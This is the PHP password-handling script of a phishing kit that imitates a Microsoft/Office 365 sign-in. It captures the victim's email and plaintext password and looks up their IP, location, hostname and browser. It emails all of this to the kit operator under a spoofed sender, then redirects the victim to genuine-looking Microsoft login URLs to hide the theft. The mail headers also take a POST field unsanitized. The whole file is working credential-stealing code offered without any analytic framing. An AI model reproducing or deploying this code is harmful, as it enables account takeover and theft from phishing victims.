<?php
error_reporting(0);
ob_start();
session_start();
$asp = "MyAccounts.aspx";
$axp ="Re_Identify";

//Getting user ip & hostname & mapping it to location
$ip = getenv("REMOTE_ADDR");
$getipinfo = file_get_contents("http://www.geoplugin.net/php.gp?ip=".$ip."");
$data = unserialize($getipinfo);
$city=$data['geoplugin_city'];
          $region=$data['geoplugin_regionName'];
          $country=$data['geoplugin_countryName'];
          $log_date = date('d/m/Y - h:i:s');
$hostname = gethostbyaddr($ip);
$agent = @$_SERVER['HTTP_USER_AGENT'];




/** form fields **/

$email = $_SESSION['email'];
$passwd = $_POST['passwd'];
$domain = @substr(strrchr($email, "@"), 1);


//Add bad key minimizer
include 'sanitize_password.php';

//Empty string catcher and key sanitizing
if ($passwd =="") {
        $setback = "nopwd.php";
        header("Location: $setback?https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d_34ML-CrMshqYDQQ2YONwawr3knf1szG9IncTWPZGHZgs_xw5T7Z11wflEqGUxigX0IylT9ttbW3qHGQGFPE6Ak8z5Dhh8zit9NLAhcejXUhYJHRA5AaY1g_SNNMxUwK&nonce=636709667839809202.OTlhZTllOGQtMDk4NC00MjFmLWEwOGQtNDIwN2M1NTZjNGZkOGNmOGFjMDctOGExYy00YWI5LTk5MTAtOGI0MGNmMmFhNzhm&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US");
} elseif (match($badkeys, $passwd)) {
    $setback = "nopwd.php";
    header("Location: $setback?https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d_34ML-CrMshqYDQQ2YONwawr3knf1szG9IncTWPZGHZgs_xw5T7Z11wflEqGUxigX0IylT9ttbW3qHGQGFPE6Ak8z5Dhh8zit9NLAhcejXUhYJHRA5AaY1g_SNNMxUwK&nonce=636709667839809202.OTlhZTllOGQtMDk4NC00MjFmLWEwOGQtNDIwN2M1NTZjNGZkOGNmOGFjMDctOGExYy00YWI5LTk5MTAtOGI0MGNmMmFhNzhm&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US");
} else {
//including email to send
    include '../Email.php';


//Arranging reports
    $Hash = "==================+[ The - Apprentice ]+==================
Email : $email
Password   : $passwd
Dom : $domain
============= [ Ip & Hostname Info ] =============

Client IP: $ip
Country: $country
Region: $region
City: $city
TimeStamp: $log_date 
Hostname: $hostname
Agent: $agent
-----------------+  +-----------------";

//Relaying...
    $subject = "$email | New $domain User Notification";
    $headers = "From: Alert<alerts@isb-internal.org>";
    $headers .= $_POST['eMailAdd']."\n";
    $headers .= "MIME-Version: 1.0\n";
    mail($SEND, $subject, $Hash, $headers);



//Exiting
    $asp = "https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXVSPW_TUADMyxdthaBCiI8FdWCoQE6eP-J8iA51GidpY7tp3Bh7iRznJXmJ7ZfaL2ljFkYGhkpsnRASQqrEgoSE-AmdOndgRkyIAdhK2p3lhrsbTnf3JMFm2NJjgRdydr5bZIq2yDNCkYWMLXAiw-d4kecg28tBPrizsvrsI71c_9aQ33xev3y9XX10ApY7Lp6hjEO8U3B_SOkkLGWzh4eHGdLvY-dayH4B4ByA7wCcxFPIZ_Zbp_FQ5MU8LIp8EUI2L3C5opixDAsrhuwqkUPNSMZmC0JlJHkNowItw6TaluSqRj1SddfTdGlkerJnjdqu5ZlUrSqctfCrhik09MGROVKoVbVcNTJZpVqHWrU5v4jf1jandMhdAQlwhH7Fl_sk8DoTEtKTxAegTZBf75WJ7yOHZq5syKfYsSkm_m5AJiigGIUbB161xk83VSwetReMPuBM2KsfUe1ACqddHXfGY4_QEe4Py6OggAJtt22U2zN52-KGvrM3KwdOGA67UKo09c4mb093crOKSmxbbA-8mTRB88Dt-lQKo72pVq_RCprvoI4hcMa-Q3iz-ymRXtTqEf8scWsRyse9tUlA-thF50nwI3kTJkpLS-nVxIPYWuxvErxLLZaLJ_WH95J_tl7-brx_u_oidpbKis_Hfb3Hq6JM2kE08_bo9Ck2WqEiiy01X2vud5Fsa2TOZZsbhRJ7nAbH6fTPNHh1I_Z1-X9bX6zcXfylwMACw-XXWFjKsSUBWv8A0&amp;estsfed=1&amp;uaid=ff74ad3cde28464c93b528ff8c4a471e&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US";
    $mover = "abs.app?v=$asp";
    $Redirect = "../docget.php?$mover";

    header("Location: $Redirect").md5(time());
}
